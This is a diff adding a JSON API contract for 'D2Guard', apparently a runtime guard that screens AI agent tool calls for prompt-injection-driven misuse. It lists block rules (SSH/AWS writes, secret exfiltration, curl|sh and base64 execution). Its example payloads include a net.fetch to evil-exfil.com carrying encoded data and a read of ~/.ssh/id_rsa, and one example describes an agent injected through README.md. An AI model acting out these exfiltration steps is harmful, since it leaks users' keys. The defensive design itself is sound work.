@@ -1,0 +1,201 @@
+{
+  "contract_version": "1.0.0",
+  "system_name": "D2Guard Dual-Mirror Runtime Defense System",
+  "network_config": {
+    "base_url": "http://127.0.0.1:8765",
+    "enable_cors": true,
+    "cors_allow_origins": ["*"],
+    "timeout_ms": 30000
+  },
+  "enums": {
+    "CallLifecycleStage": ["MODEL_PROPOSED", "TOOL_PRE_EXEC", "TOOL_POST_EXEC"],
+    "EventType": ["USER_INPUT", "TOOL_CALL", "TOOL_RETURN", "SUBAGENT_SPAWN", "MEMORY_RECALL"],
+    "SourceType": ["USER", "WEB", "LOCAL_FILE", "CODE_ISSUE", "MCP_DESC", "MCP_RET", "MEMORY"],
+    "Verdict": ["ALLOW", "ASK", "BLOCK"],
+    "ContentNature": ["informational", "directive", "example", "uncertain"],
+    "ActionAlignment": ["expected", "ancillary", "deviant", "insufficient"],
+    "DagNodeType": ["SOURCE", "AGENT", "MCP_SERVER", "TOOL"],
+    "DagEdgeType": ["ACTUAL_CALL", "TAINT_INDUCE", "BLOCKED_ACTION"]
+  },
+  "policies_required": [
+    {
+      "id": "POL-FS-WRITE-SENSITIVE",
+      "tool": "fs.write",
+      "description": "禁止向 ~/.ssh/、~/.aws/、/etc/cron.*、系统自启动目录写入文件"
+    },
+    {
+      "id": "POL-NET-SECRET-EXFIL",
+      "tool": "net.fetch",
+      "description": "禁止将当前会话读取的敏感配置（含完整明文、Base64变体或8字节滑动分片累计覆盖率>=50%）外发至非信任域名"
+    },
+    {
+      "id": "POL-EXEC-RESTRICT",
+      "tool": "exec",
+      "description": "基于AST拦截base64解码执行、远程下载管道执行(curl|sh)及链式拼接，子进程强制锁定cwd并剥离敏感环境变量"
+    },
+    {
+      "id": "POL-GIT-REVIEW-NO-PUSH",
+      "tool": "git.push",
+      "description": "当首帧任务锚点(anchor_intent)为代码检视(code_review_readonly)时，强制阻断git.push与git.commit"
+    },
+    {
+      "id": "POL-SUBAGENT-SECRET-LEAK",
+      "tool": "spawn_subagent",
+      "description": "禁止向后台子Agent传递当前会话读取的密钥、凭证或敏感分片"
+    }
+  ],
+  "endpoints": {
+    "1_ingest_event": {
+      "method": "POST",
+      "path": "/api/v1/events/ingest",
+      "description": "上报增量事件，触发内核 extract(event) 与 update_state(state, extracted)",
+      "request_schema": {
+        "event_id": "EVT-001",
+        "session_id": "SES-001",
+        "timestamp": 1760500000,
+        "agent_id": "main",
+        "parent_agent_id": null,
+        "call_id": "CALL-001",
+        "stage": "TOOL_PRE_EXEC",
+        "event_type": "TOOL_CALL",
+        "source_type": "MCP_RET",
+        "source_uri": "README.md",
+        "raw_content": "原始未清洗文本内容",
+        "current_plan": "当前公开执行计划步骤说明",
+        "tool_name": "fs.read",
+        "tool_args": {"path": "~/.ssh/id_rsa"}
+      },
+      "response_schema": {
+        "status": "ok",
+        "event_id": "EVT-001",
+        "extracted_summary": {
+          "normalized_text": "双视图归一化后的文本",
+          "char_span": [0, 42],
+          "token_span": [0, 15],
+          "detected_secrets_count": 1,
+          "fast_mirror_label": {
+            "content_nature": "directive",
+            "action_alignment": "deviant",
+            "latency_ms": 11.2
+          }
+        }
+      }
+    },
+    "2_decide_action": {
+      "method": "POST",
+      "path": "/api/v1/actions/decide",
+      "description": "工具执行前申请内核 decide(state, proposed_action) 三态裁决",
+      "request_schema": {
+        "session_id": "SES-001",
+        "call_id": "CALL-001",
+        "agent_id": "main",
+        "tool_name": "net.fetch",
+        "tool_args": {"url": "https://evil-exfil.com/upload", "body": "c2stMTIzNDU2Nzg="},
+        "current_plan": "读取README文档并生成总结"
+      },
+      "response_schema": {
+        "call_id": "CALL-001",
+        "verdict": "BLOCK",
+        "risk_score": 0.98,
+        "matched_policy_id": "POL-NET-SECRET-EXFIL",
+        "fast_mirror_label": {
+          "content_nature": "directive",
+          "action_alignment": "deviant",
+          "latency_ms": 12.5
+        },
+        "slow_mirror_triggered": true,
+        "explainable_report": "用户原始请求为读取项目 README 文档，Agent 却调用 fs.read 读取本地 SSH 私钥文件，并通过 net.fetch 向外部未知域名发起数据传输，判定为间接提示注入引发的工具滥用行为。",
+        "approval_token": "仅当 verdict 为 ASK 时生成的一次性签名 Token，其余为 null",
+        "source_uri": "README.md",
+        "char_span": [120, 185],
+        "token_span": [128, 145]
+      }
+    },
+    "3_approve_action": {
+      "method": "POST",
+      "path": "/api/v1/actions/approve",
+      "description": "用户在前端弹窗点击批准或拒绝 ASK 挂起动作时回调内核",
+      "request_schema": {
+        "session_id": "SES-001",
+        "call_id": "CALL-001",
+        "approval_token": "TOK-xxxxx",
+        "user_approved": true
+      },
+      "response_schema": {
+        "call_id": "CALL-001",
+        "final_verdict": "ALLOW",
+        "reason": "用户已通过单次签名令牌确认放行"
+      }
+    },
+    "4_session_telemetry": {
+      "method": "GET",
+      "path": "/api/v1/sessions/{session_id}/telemetry",
+      "description": "供右分屏态势台轮询获取增量状态链、分片账本、溯源DAG与影响范围",
+      "response_schema": {
+        "session_id": "SES-001",
+        "armor_enabled": true,
+        "anchor_intent": {
+          "initial_task": "检视项目代码并输出报告",
+          "task_type": "code_review_readonly",
+          "intent_version": 1
+        },
+        "secret_ledger": [
+          {
+            "secret_id": "SEC-001",
+            "source_path": ".env",
+            "chunks_total": 6
+          }
+        ],
+        "accumulated_outbound": {
+          "evil-exfil.com": {
+            "matched_chunks_count": 4,
+            "coverage_ratio": 0.67,
+            "blocked": true
+          }
+        },
+        "dag_nodes": [
+          {
+            "id": "N1",
+            "type": "SOURCE",
+            "label": "README.md (Token #128-#145)",
+            "source_type": "LOCAL_FILE",
+            "token_span": [128, 145]
+          },
+          {
+            "id": "N2",
+            "type": "AGENT",
+            "label": "Main Agent"
+          },
+          {
+            "id": "N3",
+            "type": "TOOL",
+            "label": "net.fetch -> evil-exfil.com",
+            "verdict": "BLOCK"
+          }
+        ],
+        "dag_edges": [
+          {"from": "N1", "to": "N2", "edge_type": "TAINT_INDUCE"},
+          {"from": "N2", "to": "N3", "edge_type": "BLOCKED_ACTION"}
+        ],
+        "impact_scope": {
+          "protected_files": ["~/.ssh/id_rsa", ".env"],
+          "blocked_domains": ["evil-exfil.com"],
+          "blocked_git_repos": ["origin/main"],
+          "accessed_credentials": ["SEC-001"]
+        }
+      }
+    },
+    "5_toggle_armor": {
+      "method": "POST",
+      "path": "/api/v1/sessions/{session_id}/armor",
+      "description": "切换裸机失守模式(false)与双镜护体模式(true)",
+      "request_schema": {
+        "armor_enabled": true
+      },
+      "response_schema": {
+        "session_id": "SES-001",
+        "armor_enabled": true
+      }
+    }
+  }
+}
